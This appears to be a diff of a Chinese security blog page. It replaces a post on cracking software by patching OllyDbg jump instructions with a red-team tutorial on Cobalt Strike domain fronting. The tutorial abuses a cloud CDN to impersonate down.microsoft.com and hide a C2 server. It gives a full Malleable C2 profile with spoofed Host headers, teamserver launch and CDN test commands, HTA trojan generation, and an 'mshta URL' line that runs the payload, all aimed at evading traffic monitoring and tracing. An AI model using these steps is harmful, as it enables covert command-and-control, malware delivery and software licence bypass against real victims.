+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623123741584.png" alt="image-20200623123741584"></p>
+<p>用以下命令发送请求 返回302</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl www.shhorse.com.cn -v</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232903474.png" alt="image-20200921232903474"></p>
-<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200921232911957.png" alt="image-20200921232911957"></p>
-<p>这次逆向是根据最后输出的结果倒推，找到那个输入后的判断是否正确的跳转参数。<br>JNZ  ;不为 0 则跳转   这次的破解就是当输入账号密码或者序列号后判断函数会给一个结果：0或者1，然后JNZ参数根据0或者1去跳转，然后我们把这个跳转函数<strong>填充掉</strong>,前期学习可以不用着急去想JNZ前面的判断函数怎么去判断0或者1,这个也是多次破解的过程 在JNZ和JMP都是跳转函数，破解的时候都可以填充一下去跑一跑程序。</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124034561.png" alt="image-20200623124034561"></p>
+<p>以上的请求说明了两个站不同的返回内容</p>
+<p>上面nslookup可看到CDN地址，随便取一个进行请求，返回403，说明并未解析到上面两个任何一个网站</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 120.221.30.218</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124749564.png" alt="image-20200623124749564"></p>
+<p>请求的时候带上host头可得到下面结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 120.221.30.218 -H &quot;host:www.shhorse.com.cn&quot; -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623124917562.png" alt="image-20200623124917562"></p>
+<p>这里可以看到和上面直接请求域名返回的结果是一样的，也正因为这个特性，我们可以通过判断host头，把数据转发到我们的CC主机，从而隐藏自己的IP信息</p>
+<h3 id="实验2"><a href="#实验2" class="headerlink" title="实验2"></a>实验2</h3><p>正常情况下，第一步我们要做的是先申请一个域名（这个域名的作用是用来配合 CDN 来隐藏我们的C2服务器），然后再申请一个CDN对我们的所申请的域名进行加速，在这个过程中CDN会要求我们在域名的解析配置中设置相应的 CNAME。</p>
+<p>某云有一个的特点：当 CDN 配置中的源 IP 为自己云的服务器时，加速时会跳过对域名的检验，直接与配置中的域名绑定的源服务器IP进行通信。换言之，只要我们的C2服务器属于该云的服务器，那么我们就无需申请域名，只需要在申请 CDN 时随便填一个没有人绑定过的域名就好了，而且这个域名我们可以填成任何高信誉的域名，例如 test.microsoft.com、oops.microsoft.com…</p>
+<p>这里我使用了down.microsoft.com,直接去申请cdn就可以了</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623133118797.png" alt="image-20200623133118797"></p>
+<p>申请完等一会即可开通</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171710392.png" alt="image-20200623171710392"></p>
+<p>CDN申请完编辑CS的<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile" target="_blank" rel="noopener">C2文件</a>，替换HOST内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line"># Amazon browsing traffic profile</span><br><span class="line">#</span><br><span class="line"># Author: @harmj0y</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;50&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line"># what else would we spawn to?</span><br><span class="line">set spawnto_x86 &quot;%windir%\\syswow64\\notepad.exe&quot;;</span><br><span class="line">set spawnto_x64 &quot;%windir%\\sysnative\\notepad.exe&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;down.microsoft.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token&#x3D;&quot;;</span><br><span class="line">            prepend &quot;skin&#x3D;noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;N4215&#x2F;adj&#x2F;MS.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;down.microsoft.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe&#x3D;ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用以下命令启动cs，默认端口可以使用vim打开teamserver修改，这里踩了个坑，使用nohup启动报错，一顿搜索是bash和sh的兼容性问题，所以前面加上bash即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash .&#x2F;teamserver IP 密码 C2文件 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>然后打开CS的web日志窗口，在cmd下执行以下操作，IP用nslookup查看一下CDN地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup down.microsoft.com.w.kunlunca.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623171804043.png" alt="image-20200623171804043"></p>
+<p>执行以下命令 域名写自己的域名，执行后看CS中的web日志是否有反应，如果有反应说明转发成功</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 183.203.69.10 -H &quot;host:down.microsoft.com&quot; -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200623172118816.png" alt="image-20200623172118816"></p>
+<p>确定可以通讯可开始建立监听  主机名称写域名 端口写注册域名时候填的端口  IP写CDN地址</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154316793.png" alt="image-20200624154316793"></p>
+<p>点击save后，填写CDN的IP地址，可以填写多个以逗号隔开</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154400777.png" alt="image-20200624154400777"></p>
+<p>创建完成监听器后需要在<a href="https://github.com/mdsecactivebreach/CACTUSTORCH" target="_blank" rel="noopener">这里</a>下载脚本，据别的文章说CS默认生成的Agent会崩溃，下载完成后点击脚本管理器，载入.cna后缀的文件即，会多出一个选项</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624154812836.png" alt="image-20200624154812836"></p>
+<p>点击该选项，生成HTA的木马（这里应该还可以生成别的类型绕过杀软的，后续再做研究）</p>
+<p><img src="https://tengxiaofei-img.oss-cn-beijing.aliyuncs.com/img/image-20200624155802896.png" alt="image-20200624155802896"></p>
+<p>生成后使用以下命令可直接上线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta URL</span><br></pre></td></tr></table></figure>
+
+<p>使用Whireshark抓包抓到的通讯数据是和CDN之间的，且HOST是我们创建的域名，这样可绕过一些流量监测设备，也可给溯源人员带来一些困难</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.anquanke.com/post/id/195011#h2-1" target="_blank" rel="noopener">https://www.anquanke.com/post/id/195011#h2-1</a></p>
+<p><a href="https://www.lz1y.cn/2019/03/21/红队基础建设-隐藏你的C2-server/" target="_blank" rel="noopener">https://www.lz1y.cn/2019/03/21/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E5%BB%BA%E8%AE%BE-%E9%9A%90%E8%97%8F%E4%BD%A0%E7%9A%84C2-server/</a></p>
+<p><a href="http://www.secwk.com/2020/02/20/16248/" target="_blank" rel="noopener">http://www.secwk.com/2020/02/20/16248/</a></p>
+<p><a href="https://evi1cg.me/archives/AMSI_bypass.html" target="_blank" rel="noopener">https://evi1cg.me/archives/AMSI_bypass.html</a></p>
 
       
 
@@ -265,7 +276,15 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">OllyDbg</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">cobaltstrike</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">域前置</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Domain Fronting</a>
         		</li>
       		
 		</ul>
@@ -277,7 +296,11 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="/categories/软件逆向//" class="article-tag-list-link color5">软件逆向</a>
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试/流量绕过//" class="article-tag-list-link color5">流量绕过</a>
         		</li>
       		
 		</ul>
@@ -332,7 +355,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/09/21/OllyDbg%E5%AD%A6%E4%B9%A0_1/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2020/06/22/%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87-cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -346,18 +369,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2020/10/23/ApereoCAS4.1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2020/09/21/%E8%BD%AF%E4%BB%B6%E9%80%86%E5%90%91-OllyDbg%E5%AD%A6%E4%B9%A0_1/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          Apereo CAS 4.1 反序列化命令执行漏洞
+          OllyDbg学习第一节
         
       </div>
     </a>
   
   
-    <a href="/2020/06/22/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">cobaltstrike域前置隐藏真实IP和恶意域名</div>
+    <a href="/2020/06/12/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-APPWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-CVE-2018-8715/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">漏洞复现-APPWeb认证绕过(CVE-2018-8715)</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -388,8 +411,8 @@
   <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
 <script>
   var cloudTieConfig = {
-    url: "http://yoursite.com/2020/09/21/OllyDbg%E5%AD%A6%E4%B9%A0_1/", 
-    sourceId: "OllyDbg学习_1",
+    url: "http://yoursite.com/2020/06/22/%E6%B5%81%E9%87%8F%E7%BB%95%E8%BF%87-cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE%E9%9A%90%E8%97%8F%E7%9C%9F%E5%AE%9EIP%E5%92%8C%E6%81%B6%E6%84%8F%E5%9F%9F%E5%90%8D/", 
+    sourceId: "流量绕过-cobaltstrike域前置隐藏真实IP和恶意域名",
     productKey: "true",
     target: "cloud-tie-wrapper"
   };
@@ -532,43 +555,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">OllyDbg</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Apereo CAS</a>
+                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">exp</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">EXP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">泛微OA</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞修复</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">泛微云桥</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CVE-2018-8715</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">APPWeb</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -580,11 +571,35 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">shiro反序列</a>
+                <a href="javascript:void(0)" class="js-tag color1">Apereo CAS</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">thinkphp</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Spring Boot</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">泛微云桥</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">OllyDbg</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE-2018-8715</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">APPWeb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞修复</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -600,7 +615,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">thinkphp</a>
+                <a href="javascript:void(0)" class="js-tag color5">泛微OA</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">shiro反序列</a>
               </li>
             
             <div class="clearfix"></div>
